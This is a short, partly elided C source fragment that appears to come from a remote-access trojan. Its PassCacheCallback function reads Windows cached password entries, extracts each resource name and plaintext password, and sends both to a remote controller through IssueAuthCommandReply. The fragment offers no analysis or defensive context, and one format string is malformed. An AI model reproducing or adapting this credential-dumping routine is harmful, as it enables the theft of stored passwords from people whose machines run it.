...
BOOL PASCAL PassCacheCallback(struct PASSWORD_CACHE_ENTRY FAR *pce, DWORD dwRefData)
{
	...
	wsprintf(buff,"index:%02d(%02d) len:%02d(%02d/%0d2)",pce->iEntry, pce->nType, pce->cbEntry, pce->cbResource, pce->cbPassword);
	IssueAuthCommandReply(dat->cas_from,dat->comid,1,buff);
	
	nCount=(pce->cbResource+1);
	if(nCount>256) nCount=256;
	lstrcpyn(buff2, pce->abResource, nCount);

	nCount=(pce->cbPassword+1);
	if(nCount>256) nCount=256;
	lstrcpyn(buff3, pce->abResource + pce->cbResource, nCount);
	
	wsprintf(buff, "Resource: '%s'  Password: '%s'\n", buff2, buff3);
	IssueAuthCommandReply(dat->cas_from,dat->comid,1,buff);
